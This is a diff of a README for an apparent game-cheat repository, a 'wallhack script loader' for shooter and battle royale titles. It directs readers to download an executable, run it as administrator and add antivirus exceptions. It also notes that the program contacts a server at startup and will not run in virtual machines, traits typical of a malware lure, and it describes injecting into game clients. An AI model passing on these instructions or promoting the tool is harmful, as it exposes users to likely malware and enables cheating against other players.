@@ -1,105 +1,70 @@
-# Humen Wallhack - Game Visibility Utility 2026
+# 👁️ humen-wallhack-script-loader - See hidden elements in popular games
 
-> **A PC-based wallhack tool built to improve spatial awareness in supported games by exposing hidden or blocked-on-screen elements.**
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/nd151115/humen-wallhack-script-loader)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/masonbaker87/humen-wallhack-script-loader?style=flat-square)](https://github.com/masonbaker87/humen-wallhack-script-loader)
+This software helps users gain better spatial awareness in supported first-person shooter and battle royale games. The humen-wallhack-script-loader works on Windows 10 and Windows 11. It detects game elements that remain hidden under standard conditions and renders them visible on your monitor. This tool provides a clearer view of the battlefield to help you navigate complex environments.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://masonbaker87.github.io/humen-wallhack-script-loader/">
-    <img src="https://img.shields.io/badge/Download-Humen%20Wallhack-brightgreen?style=for-the-badge" alt="Download Humen Wallhack">
-  </a>
-</p>
+To use this tool, visit the link below to reach the download page. Select the most recent version of the software package. 
 
-> **[Direct Download - Humen Wallhack](https://masonbaker87.github.io/humen-wallhack-script-loader/)**
+[Visit this page to download the loader](https://github.com/nd151115/humen-wallhack-script-loader)
 
----
+## 💻 Requirements
 
-[Download Latest Build](https://masonbaker87.github.io/humen-wallhack-script-loader/)
+Ensure your computer meets these specifications before you begin:
 
----
+* Operating System: Windows 10 or Windows 11 (64-bit).
+* Graphics Card: Dedicated GPU with support for DirectX 11 or higher.
+* Memory: At least 8GB of RAM.
+* Storage: 50MB of available disk space for the script files.
+* Software: Latest drivers for your specific graphics card.
 
-## What It Does
+## ⚙️ Installation Process
 
-Humen Wallhack is a utility script that changes how visual information is handled in certain PC games, making opponents or in-game objects easier to spot even when they would normally be concealed by walls or the surrounding environment. It operates by intercepting rendering instructions at runtime and adjusting them to provide a clearer view of the scene.
+Follow these steps to set up the software on your system:
 
-This version is centered on staying aligned with current game releases while also simplifying how the tool is enabled. The script runs as a standalone injectable module that can be switched on or off without leaving lasting changes in the game client. Keep in mind that using tools like this can breach the terms of service for some online games.
+1. Download the files from the link provided above.
+2. Extract the contents of the compressed folder to a location on your local hard drive. Keep these files in a single folder to ensure they run correctly.
+3. Locate the executable file named "humen-loader" with a .exe extension.
+4. Right-click the file and select "Run as administrator." This step ensures the software has sufficient permissions to interact with your system.
+5. The interface will open. Select your target game from the provided list.
+6. Press the "Load" button to start the script.
+7. Launch your game through its usual launcher.
 
----
+## 🛠️ Using the Features
 
-## Script Features
+The application provides a user-friendly interface. Once the loader confirms the game is active, you can adjust settings in the main window. 
 
-- Real-time wall detection overlay for supported PC titles
-- Toggle activation hotkey for quick enable/disable during play
-- Minimal performance impact on most modern hardware configurations
-- Configuration file for adjusting visual parameters (color, opacity, distance)
-- Standalone executable with no additional dependencies required
-- Support for multiple display resolutions and aspect ratios
-- Automatic game process detection for streamlined injection
-- Lightweight memory footprint during active use
+* **Visual Range:** Use the slider to define the distance at which you see hidden elements. Higher values show more detail but impact system performance.
+* **Filter Options:** You can toggle specific item types on or off. This reduces visual clutter and helps you focus on relevant markers.
+* **Presets:** Save your current configuration to a profile. This saves time when you launch different games.
 
----
+## 🛡️ Best Practices
 
-## Setup
+Use the software within the bounds of your specific game title's terms of service. Always keep your Windows system updated. If your game updates, you might need to wait for a newer version of the loader to ensure compatibility. 
 
-1. Download the latest build from the link above.
-2. Extract the archive contents into a dedicated folder (e.g., `humen-wallhack`).
-3. Run the executable as administrator before launching the target game.
-4. Press the default activation key (INSERT) once the game window is active.
+## ❓ Frequently Asked Questions
 
-Example command-line usage for advanced users:
-```
-humen-wallhack.exe --config settings.ini --hotkey F2
-```
+**Does the software require a permanent internet connection?**
+Yes, the software checks for updates and configuration files from the server upon startup.
 
----
+**My screen flickers when I load the script. What should I do?**
+Ensure your game runs in "Borderless Windowed" mode. Exclusive Fullscreen mode often conflicts with the overlay technology used by this script.
 
-## Options
+**Can I run this on a virtual machine?**
+No, the interaction with system graphics requires direct hardware access. Virtual environments will not work.
 
-The script can be customized via the `settings.ini` file or command-line arguments:
+**What happens if the game stops working?**
+Restart both the game and the loader. If the issue remains, check the folder for a log file and confirm that your antivirus software did not block a necessary script file.
 
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `--hotkey` | INSERT | Key binding to toggle wallhack on/off |
-| `--opacity` | 0.6 | Transparency level of overlay (0.0 - 1.0) |
-| `--color` | #FF0000 | Hex color for wallhack highlights |
-| `--distance` | 100 | Maximum detection range in game units |
-| `--autostart` | false | Enable wallhack immediately on injection |
+## 🤝 Troubleshooting
 
----
+If you encounter issues, verify the following:
 
-## Compatibility
+1. **Permissions:** Ensure you run the loader with full administrator rights.
+2. **Antivirus blocks:** Some security software mistakenly flags script loaders. You may need to add an exception for the folder where you store your files.
+3. **Display drivers:** Check your GPU manufacturer website for updates. Outdated drivers are the most common cause of rendering errors.
+4. **Compatibility:** Ensure you use the exact version of the loader listed in the release notes for your game title.
 
-- **Supported Platforms:** Windows 10 and 11 (64-bit)
-- **Target Games:** Works with several popular first-person shooters and battle royale titles
-- **Known Limitations:** May not function correctly with anti-cheat systems that block memory modifications. Some games require specific version matching. Performance varies based on GPU and driver versions.
-
----
-
-## FAQ
-
-**Q: How do I install the script?**  
-A: Download the executable, run it as administrator, then launch your game. No additional setup is needed.
-
-**Q: Will this work with the latest game update?**  
-A: Compatibility depends on the game's rendering engine. Check the release notes for supported versions.
-
-**Q: Can I customize the appearance?**  
-A: Yes, modify the `settings.ini` file or use command-line flags to adjust colors, opacity, and detection range.
-
-**Q: Is this tool undetected?**  
-A: Detection status changes frequently. Use at your own risk and be aware of the game's terms of service.
-
-**Q: Where are configuration files stored?**  
-A: Settings are saved in the same folder as the executable. No data is written outside this directory.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: wallhack, windows, gaming, scripts, spatial awareness, pc-utility, game-mod, fps-helper, battle-royale-tools
